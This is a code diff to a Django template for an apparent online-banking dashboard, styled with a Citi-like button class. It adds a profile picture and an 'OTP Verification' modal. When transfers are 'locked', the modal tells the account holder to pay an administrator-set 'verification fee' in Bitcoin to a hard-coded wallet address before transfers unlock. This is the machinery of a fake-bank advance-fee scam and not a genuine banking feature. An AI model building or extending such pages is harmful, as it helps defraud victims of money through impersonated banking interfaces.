@@ -36,7 +36,11 @@
             </a>
             
             <div class="user-profile-widget">
-                <i class="fa-solid fa-circle-user"></i>
+                {% if user.userprofile.profile_picture %}
+                    <img src="{{ user.userprofile.profile_picture.url }}" alt="Profile picture" class="user-avatar-img">
+                {% else %}
+                    <i class="fa-solid fa-circle-user"></i>
+                {% endif %}
                 <div class="user-info">
                     <span class="user-greeting">Welcome, <strong>{{ user.userprofile.full_name|default:user.username }}</strong></span>
                     <span class="last-login">Account Status: <strong class="text-success">Active</strong></span>
@@ -82,6 +86,16 @@
                 <button class="quick-btn" onclick="openCryptoModal()">
                     <i class="fa-brands fa-bitcoin"></i> Deposit BTC
                 </button>
+
+                {% if user.userprofile.transfer_locked %}
+                    <button class="quick-btn" onclick="openOtpModal()">
+                        <i class="fa-solid fa-unlock-keyhole"></i> OTP Verification
+                    </button>
+                {% else %}
+                    <span class="quick-btn quick-btn-verified">
+                        <i class="fa-solid fa-circle-check"></i> OTP Verified
+                    </span>
+                {% endif %}
 
                 <a href="{% url 'verify_pin' %}" class="quick-btn">
                     <i class="fa-solid fa-shield-halved"></i> Verify PIN
@@ -228,6 +242,46 @@
 
                 <div class="modal-box-footer">
                     <button type="button" class="btn-secondary" onclick="closeModal('cryptoModal')">Cancel</button>
+                    <button type="submit" class="btn-citi-blue">I Have Completed Payment</button>
+                </div>
+            </form>
+        </div>
+    </div>
+
+    <!-- OTP Verification Modal -->
+    <div id="otpModal" class="modal-backdrop">
+        <div class="modal-box">
+            <div class="modal-box-header">
+                <h3><i class="fa-solid fa-unlock-keyhole"></i> OTP Verification</h3>
+                <button type="button" class="btn-close" onclick="closeModal('otpModal')">&times;</button>
+            </div>
+            <form method="POST" action="{% url 'pay_verification_fee' %}" class="modal-box-body">
+                {% csrf_token %}
+
+                <p class="otp-modal-note">
+                    A one-time OTP verification fee is required to unlock transfers on this account.
+                    This amount is set by your account administrator.
+                </p>
+
+                <div class="form-group otp-fee-box">
+                    <label>Verification Fee Due</label>
+                    <h2 class="otp-fee-amount">{{ user.userprofile.currency_symbol }}{{ user.userprofile.verification_fee|default:"0.00" }}</h2>
+                </div>
+
+                <div class="qr-code-wrapper">
+                    <img src="{% static 'btc_qr.jpg' %}" alt="BTC QR Code" class="btc-qr-img">
+                </div>
+
+                <div class="form-group">
+                    <label>Bitcoin (BTC) Payment Address</label>
+                    <div class="input-copy-group">
+                        <input type="text" id="otpBtcAddress" value="bc1qm9qlahgkrmh0xt92t0ny0p5m568pyn5c6n4l9z" readonly class="form-control">
+                        <button type="button" class="btn-copy" onclick="copyToClipboard('otpBtcAddress')"><i class="fa-solid fa-copy"></i> Copy</button>
+                    </div>
+                </div>
+
+                <div class="modal-box-footer">
+                    <button type="button" class="btn-secondary" onclick="closeModal('otpModal')">Cancel</button>
                     <button type="submit" class="btn-citi-blue">I Have Completed Payment</button>
                 </div>
             </form>
